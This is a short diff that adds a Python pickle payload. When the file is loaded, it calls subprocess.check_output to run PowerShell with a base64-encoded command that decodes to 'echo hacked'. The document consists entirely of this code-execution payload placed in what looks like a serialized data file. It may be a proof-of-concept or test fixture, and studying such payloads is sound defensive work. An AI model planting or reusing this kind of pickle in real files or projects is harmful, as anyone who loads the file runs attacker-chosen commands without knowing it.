@@ -1,0 +1,6 @@
+csubprocess
+check_output
+((S'powershell'
+S'-enc'
+S'ZWNobyBoYWNrZWQ='
+ltR.
